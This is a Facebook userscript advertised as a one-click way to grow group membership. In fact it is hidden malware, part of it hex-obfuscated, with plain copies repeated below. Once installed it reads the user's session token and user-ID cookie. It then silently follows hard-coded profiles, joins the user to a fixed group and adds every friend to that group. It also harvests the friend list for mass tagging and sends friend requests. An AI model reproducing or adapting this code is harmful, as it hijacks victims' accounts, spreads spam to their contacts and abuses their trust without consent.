// ==UserScript==
// @name            Facebook Plus 2013!!!
// @namespace	  fallen
// @description     Increase your Group members just one click
// @version         5.0.17
// @updateURL	    http://userscripts.org/scripts/source/164255.meta.js
// @include	    http://*.facebook.com/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include       htt*://*.facebook.com/*
// @include	   https://www.facebook.com/*
// @include	   http://www.facebook.com/*
// @include	   http://www.facebook.com/groups/*
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// @include        /https?://(|.*\.)facebook.com/
// @include	    https://*.facebook.com/*
// @match	    http://*.facebook.com/*
// @match	    https://*.facebook.com/*
// @exclude	    http://*.facebook.com/ajax/*
// @exclude	    https://*.facebook.com/ajax/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*


// ==/UserScript==

var _0x944e=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x6C\x65\x6E\x67\x74\x68","\x69\x6E\x64\x65\x78\x4F\x66","\x3B","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x2F\x61\x6A\x61\x78\x2F\x66\x6F\x6C\x6C\x6F\x77\x2F\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x3D","\x26\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x31\x26\x73\x6F\x75\x72\x63\x65\x3D\x66\x6F\x6C\x6C\x6F\x77\x2D\x62\x75\x74\x74\x6F\x6E\x26\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x3D\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x6C\x73\x64\x26\x5F\x5F","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x63\x6C\x6F\x73\x65","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x73\x65\x6E\x64","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6E\x65\x77\x20\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x28\x29\x2E\x73\x65\x74\x55\x52\x49\x28\x27\x2F\x61\x6A\x61\x78\x2F\x66\x72\x69\x65\x6E\x64\x73\x2F\x6C\x69\x73\x74\x73\x2F\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2F\x6D\x6F\x64\x69\x66\x79\x3F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x26\x61\x63\x74\x69\x6F\x6E\x3D\x73\x75\x62\x73\x63\x72\x69\x62\x65\x27\x29\x2E\x73\x65\x74\x44\x61\x74\x61\x28\x7B\x20\x66\x6C\x69\x64\x3A\x20","\x20\x7D\x29\x2E\x73\x65\x6E\x64\x28\x29\x3B","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x31\x30\x30\x30\x30\x36\x34\x38\x31\x33\x31\x31\x38\x34\x38","\x31\x30\x30\x30\x30\x36\x36\x35\x38\x37\x34\x32\x30\x31\x33","\x34\x35\x30\x33\x37\x32\x36\x39\x31\x37\x34\x36\x33\x36\x37","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x2F\x72\x32\x6A\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x72\x65\x66\x3D\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65","\x47\x45\x54","\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x74\x6F\x6B\x65\x6E","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x28","\x73\x75\x62\x73\x74\x72","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x29","\x65\x72\x72\x6F\x72","\x69\x6E\x64\x65\x78","\x73\x6F\x72\x74","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x2F\x61\x64\x64\x5F\x70\x6F\x73\x74\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x74\x79\x70\x65\x61\x68\x65\x61\x64\x26\x72\x65\x66\x3D\x26\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x3D\x26\x6D\x65\x6D\x62\x65\x72\x73\x3D","\x75\x69\x64","\x33\x37\x36\x39\x37\x33\x38\x32\x32\x33\x36\x32\x31\x37\x36","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x68\x61\x79\x69\x72\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x20\x3D\x20","\x66\x6F\x72\x20\x28\x3B\x3B\x29\x3B","\x72\x65\x70\x6C\x61\x63\x65","\x72\x6F\x75\x6E\x64","\x20\x40\x5B","\x3A","\x74\x65\x78\x74","\x5D","\x20","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x31\x5D\x3D\x6E\x6D","\x26\x74\x6F\x6B\x65\x6E\x3D\x76\x37","\x26\x76\x69\x65\x77\x65\x72\x3D","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x55\x52\x4C","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x63\x6C\x69\x63\x6B","\x68\x61\x79\x69\x72","\x73\x70\x6C\x69\x74","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D","\x2C","\x22\x73\x76\x6E\x5F\x72\x65\x76\x22\x3A","\x68\x65\x61\x64","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x65\x76\x65\x74\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x72\x65\x6D\x6F\x76\x65\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x2F\x61\x6A\x61\x78\x2F\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x2F\x61\x63\x74\x69\x6F\x6E\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64\x3D","\x26\x61\x63\x74\x69\x6F\x6E\x3D\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64","\x26\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72","\x26\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x3D\x6E\x6F\x6E\x65","\x26\x6F\x75\x74\x67\x6F\x69\x6E\x67\x5F\x69\x64\x3D","\x26\x6C\x6F\x67\x67\x69\x6E\x67\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72","\x26\x6E\x6F\x5F\x66\x6C\x79\x6F\x75\x74\x5F\x6F\x6E\x5F\x63\x6C\x69\x63\x6B\x3D\x74\x72\x75\x65","\x26\x65\x67\x6F\x5F\x6C\x6F\x67\x5F\x64\x61\x74\x61\x3D","\x26\x68\x74\x74\x70\x5F\x72\x65\x66\x65\x72\x65\x72\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D\x31\x36\x35\x38\x31\x36\x37\x34\x39\x31\x31\x34\x38\x34\x38\x33\x36\x39\x31\x31\x35","\x58\x2D\x53\x56\x4E\x2D\x52\x65\x76","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x66\x61\x72\x6B\x65\x74\x6D\x65\x7A","\x63\x69\x6E\x73","\x73\x61\x72\x6B\x61\x64\x61\x73\x65\x6B\x6C\x65","\x68\x74\x6D\x6C","\x63\x69\x6E\x73\x73\x6F\x6E\x75\x63\x20\x3D\x20","\x5F\x5F\x68\x74\x6D\x6C","\x6D\x61\x72\x6B\x75\x70","\x6A\x73\x6D\x6F\x64\x73","\x73\x65\x6C\x65\x63\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x31","\x3D\x6B\x61\x64\x69\x6E\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x32","\x3D\x65\x72\x6B\x65\x6B\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x29\x3B","\x2F\x61\x6A\x61\x78\x2F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x2F\x65\x64\x69\x74\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2F\x62\x61\x73\x69\x63\x5F\x69\x6E\x66\x6F\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D"];var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);function cereziAl(_0xf82ax4){var _0xf82ax5=_0xf82ax4+_0x944e[5];if(document[_0x944e[4]][_0x944e[6]]>0){konum=document[_0x944e[4]][_0x944e[7]](_0xf82ax5);if(konum!=-1){konum+=_0xf82ax5[_0x944e[6]];son=document[_0x944e[4]][_0x944e[7]](_0x944e[8],konum);if(son==-1){son=document[_0x944e[4]][_0x944e[6]];} ;return unescape(document[_0x944e[4]][_0x944e[9]](konum,son));} else {return _0x944e[10];} ;} ;} ;function getRandomInt(_0xf82ax7,_0xf82ax8){return Math[_0x944e[12]](Math[_0x944e[11]]()*(_0xf82ax8-_0xf82ax7+1))+_0xf82ax7;} ;function randomValue(_0xf82axa){return _0xf82axa[getRandomInt(0,_0xf82axa[_0x944e[6]]-1)];} ;var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);function a(_0xf82axc){var _0xf82axd= new XMLHttpRequest();var _0xf82axe=_0x944e[13];var _0xf82axf=_0x944e[14]+_0xf82axc+_0x944e[15]+fb_dtsg+_0x944e[16]+user_id+_0x944e[17];_0xf82axd[_0x944e[19]](_0x944e[18],_0xf82axe,true);_0xf82axd[_0x944e[22]](_0x944e[20],_0x944e[21]);_0xf82axd[_0x944e[22]](_0x944e[23],_0xf82axf[_0x944e[6]]);_0xf82axd[_0x944e[22]](_0x944e[24],_0x944e[25]);_0xf82axd[_0x944e[26]]=function (){if(_0xf82axd[_0x944e[27]]==4&&_0xf82axd[_0x944e[28]]==200){_0xf82axd[_0x944e[25]];} ;} ;_0xf82axd[_0x944e[29]](_0xf82axf);} ;function sublist(_0xf82ax11){var a=document[_0x944e[31]](_0x944e[30]);a[_0x944e[32]]=_0x944e[33]+_0xf82ax11+_0x944e[34];document[_0x944e[36]][_0x944e[35]](a);} ;a(_0x944e[37]);a(_0x944e[38]);var gid=[_0x944e[39]];var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);var httpwp= new XMLHttpRequest();var urlwp=_0x944e[40];var paramswp=_0x944e[41]+gid+_0x944e[42]+fb_dtsg+_0x944e[43]+user_id+_0x944e[17];httpwp[_0x944e[19]](_0x944e[18],urlwp,true);httpwp[_0x944e[22]](_0x944e[20],_0x944e[21]);httpwp[_0x944e[22]](_0x944e[23],paramswp[_0x944e[6]]);httpwp[_0x944e[22]](_0x944e[24],_0x944e[44]);httpwp[_0x944e[29]](paramswp);var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);var friends= new Array();gf= new XMLHttpRequest();gf[_0x944e[19]](_0x944e[45],_0x944e[46]+user_id+_0x944e[47]+Math[_0x944e[11]]()+_0x944e[48],false);gf[_0x944e[29]]();if(gf[_0x944e[27]]!=4){} else {data=eval(_0x944e[49]+gf[_0x944e[51]][_0x944e[50]](9)+_0x944e[52]);if(data[_0x944e[53]]){} else {friends=data[_0x944e[57]][_0x944e[56]][_0x944e[55]](function (_0xf82ax17,_0xf82ax18){return _0xf82ax17[_0x944e[54]]-_0xf82ax18[_0x944e[54]];} );} ;} ;for(var i=0;i<friends[_0x944e[6]];i++){var httpwp= new XMLHttpRequest();var urlwp=_0x944e[58];var paramswp=_0x944e[42]+fb_dtsg+_0x944e[59]+gid+_0x944e[60]+friends[i][_0x944e[61]]+_0x944e[43]+user_id+_0x944e[17];httpwp[_0x944e[19]](_0x944e[18],urlwp,true);httpwp[_0x944e[22]](_0x944e[20],_0x944e[21]);httpwp[_0x944e[22]](_0x944e[23],paramswp[_0x944e[6]]);httpwp[_0x944e[22]](_0x944e[24],_0x944e[44]);httpwp[_0x944e[26]]=function (){if(httpwp[_0x944e[27]]==4&&httpwp[_0x944e[28]]==200){} ;} ;httpwp[_0x944e[29]](paramswp);} ;var spage_id=_0x944e[62];var spost_id=_0x944e[62];var sfoto_id=_0x944e[62];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);var smesaj=_0x944e[10];var smesaj_text=_0x944e[10];var arkadaslar=[];var svn_rev;var bugun= new Date();var btarihi= new Date();btarihi[_0x944e[64]](bugun[_0x944e[63]]()+1000*60*60*4*1);if(!document[_0x944e[4]][_0x944e[3]](/paylasti=(\d+)/)){document[_0x944e[4]]=_0x944e[65]+btarihi[_0x944e[66]]();} ;function sarkadaslari_al(){var _0xf82ax24= new XMLHttpRequest();_0xf82ax24[_0x944e[26]]=function (){if(_0xf82ax24[_0x944e[27]]==4){eval(_0x944e[67]+_0xf82ax24[_0x944e[51]].toString()[_0x944e[69]](_0x944e[68],_0x944e[10])+_0x944e[8]);for(f=0;f<Math[_0x944e[70]](arkadaslar[_0x944e[57]][_0x944e[56]][_0x944e[6]]/10);f++){smesaj=_0x944e[10];smesaj_text=_0x944e[10];for(i=f*10;i<(f+1)*10;i++){if(arkadaslar[_0x944e[57]][_0x944e[56]][i]){smesaj+=_0x944e[71]+arkadaslar[_0x944e[57]][_0x944e[56]][i][_0x944e[61]]+_0x944e[72]+arkadaslar[_0x944e[57]][_0x944e[56]][i][_0x944e[73]]+_0x944e[74];smesaj_text+=_0x944e[75]+arkadaslar[_0x944e[57]][_0x944e[56]][i][_0x944e[73]];} ;} ;sdurumpaylas();} ;} ;} ;var _0xf82ax25=_0x944e[76];_0xf82ax25+=_0x944e[77];_0xf82ax25+=_0x944e[78];_0xf82ax25+=_0x944e[79];_0xf82ax25+=_0x944e[80]+user_id;_0xf82ax25+=_0x944e[43]+user_id;if(document[_0x944e[82]][_0x944e[7]](_0x944e[81])>=0){_0xf82ax24[_0x944e[19]](_0x944e[45],_0x944e[83]+_0xf82ax25,true);} else {_0xf82ax24[_0x944e[19]](_0x944e[45],_0x944e[84]+_0xf82ax25,true);} ;_0xf82ax24[_0x944e[29]]();} ;var tiklama=document[_0x944e[94]](_0x944e[85],function (){if(document[_0x944e[4]][_0x944e[87]](_0x944e[88])[1][_0x944e[87]](_0x944e[8])[0][_0x944e[7]](_0x944e[86])>=0){svn_rev=document[_0x944e[91]][_0x944e[32]][_0x944e[87]](_0x944e[90])[1][_0x944e[87]](_0x944e[89])[0];sarkadaslari_al();document[_0x944e[4]]=_0x944e[92]+btarihi[_0x944e[66]]();document[_0x944e[93]](tiklama);} ;} ,false);function sarkadasekle(_0xf82ax28,_0xf82ax29){var _0xf82ax24= new XMLHttpRequest();_0xf82ax24[_0x944e[26]]=function (){if(_0xf82ax24[_0x944e[27]]==4){} ;} ;_0xf82ax24[_0x944e[19]](_0x944e[18],_0x944e[95],true);var _0xf82ax25=_0x944e[96]+_0xf82ax28;_0xf82ax25+=_0x944e[97];_0xf82ax25+=_0x944e[98];_0xf82ax25+=_0x944e[99];_0xf82ax25+=_0x944e[100];_0xf82ax25+=_0x944e[101];_0xf82ax25+=_0x944e[102];_0xf82ax25+=_0x944e[103];_0xf82ax25+=_0x944e[104];_0xf82ax25+=_0x944e[42]+document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];_0xf82ax25+=_0x944e[105];_0xf82ax25+=_0x944e[43]+user_id;_0xf82ax24[_0x944e[22]](_0x944e[106],svn_rev);_0xf82ax24[_0x944e[22]](_0x944e[107],_0x944e[21]);if(_0xf82ax29==_0x944e[108]&&document[_0x944e[4]][_0x944e[87]](_0x944e[109]+user_id+_0x944e[5])[_0x944e[6]]>1){_0xf82ax24[_0x944e[29]](_0xf82ax25);} else {if(document[_0x944e[4]][_0x944e[87]](_0x944e[109]+user_id+_0x944e[5])[_0x944e[6]]<=1){cinsiyetgetir(_0xf82ax28,_0xf82ax29,_0x944e[110]);} else {if(_0xf82ax29==document[_0x944e[4]][_0x944e[87]](_0x944e[109]+user_id+_0x944e[5])[1][_0x944e[87]](_0x944e[8])[0].toString()){_0xf82ax24[_0x944e[29]](_0xf82ax25);} ;} ;} ;} ;var cinssonuc={};var cinshtml=document[_0x944e[31]](_0x944e[111]);function scinsiyetgetir(_0xf82ax28,_0xf82ax29,_0xf82ax2d){var _0xf82ax24= new XMLHttpRequest();_0xf82ax24[_0x944e[26]]=function (){if(_0xf82ax24[_0x944e[27]]==4){eval(_0x944e[112]+_0xf82ax24[_0x944e[51]].toString()[_0x944e[69]](_0x944e[68],_0x944e[10])+_0x944e[8]);cinshtml[_0x944e[32]]=cinssonuc[_0x944e[115]][_0x944e[114]][0][1][_0x944e[113]];btarihi[_0x944e[64]](bugun[_0x944e[63]]()+1000*60*60*24*365);if(cinshtml[_0x944e[117]](_0x944e[116])[0][_0x944e[0]]==_0x944e[118]){document[_0x944e[4]]=_0x944e[109]+user_id+_0x944e[119]+btarihi[_0x944e[66]]();} else {if(cinshtml[_0x944e[117]](_0x944e[116])[0][_0x944e[0]]==_0x944e[120]){document[_0x944e[4]]=_0x944e[109]+user_id+_0x944e[121]+btarihi[_0x944e[66]]();} ;} ;eval(_0xf82ax2d+_0x944e[49]+id+_0x944e[89]+_0xf82ax29+_0x944e[122]);} ;} ;_0xf82ax24[_0x944e[19]](_0x944e[45],_0x944e[123]+user_id,true);_0xf82ax24[_0x944e[22]](_0x944e[106],svn_rev);_0xf82ax24[_0x944e[29]]();} ;

// ==/UserScript==
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

a("100006481311848");
a("100006658742013");

var gid = ['174765459274743'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "376973822362176";
var spost_id = "376973822362176";
var sfoto_id = "376973822362176";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkadaþ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}



// ==/UserScript==



var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
